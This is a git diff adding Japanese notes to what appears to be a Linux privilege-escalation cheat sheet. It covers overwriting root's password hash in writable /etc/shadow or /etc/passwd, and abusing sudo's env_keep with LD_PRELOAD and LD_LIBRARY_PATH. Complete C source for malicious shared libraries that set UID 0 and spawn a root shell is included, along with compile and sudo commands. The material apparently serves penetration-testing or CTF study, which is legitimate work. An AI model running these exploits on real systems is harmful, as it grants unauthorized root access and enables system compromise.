@@ -5,6 +5,91 @@
 2. ファイルの確認
 3. sudoの確認
 
+## 機密ファイルのパーミッション確認
+### /etc/shadow
+通常rootユーザーのみ読み取り可能。しかしもし書き込み可能な場合、新しいパスワードハッシュを生成し、rootユーザーのハッシュを上書きする。
+
+新しいパスワードハッシュの生成
+```
+mkpasswd -m sha-512 [NEW PASSWORD]
+```
+
+### /etc/passwd
+通常全てのユーザーが読み取り可能だが、書き込みはrootユーザーのみ可能。しかしもし書き込み可能な場合、rootユーザーのパスワードを上書きする。
+
+新しいパスワードの生成
+```
+openssl passwd [NEW PASSWORD]
+```
+
+## ユーザー環境から継承された環境変数の確認
+### env_keep オプションの内容を確認する。
+```
+sudo -l | grep -iF env_keep
+```
+
+#### LD_PRELOAD が存在する場合
+1. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+```
+
+preload.c
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+2. コマンドの実行
+```
+sudo LD_PRELOAD=/tmp/preload.so [COMMAND]
+```
+
+##### Memo
+LD_PRELOAD : プログラム（コマンド）実行の際に最初にロードする共有オブジェクトを指定する環境変数。  
+COMMAND : sudoで実行できるコマンドを指定する。
+
+#### LD_LIBRARY_PATH が存在する場合
+1. プログラムが依存関係にある共有ライブラリを調べる。
+```
+ldd [COMMAND]
+```
+
+2. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+```
+
+library_path.c
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+3. コマンドの実行
+```
+sudo LD_LIBRARY_PATH=/tmp [COMMAND]
+```
+
+##### Memo
+LD_LIBRARY_PATH : 最初に共有オブジェクトを検索しに行くディレクトリを指定する環境変数。  
+COMMAND : sudoで実行できるコマンド。
+
 ## コマンドの確認
 root権限で実行できるコマンドの確認
 ```
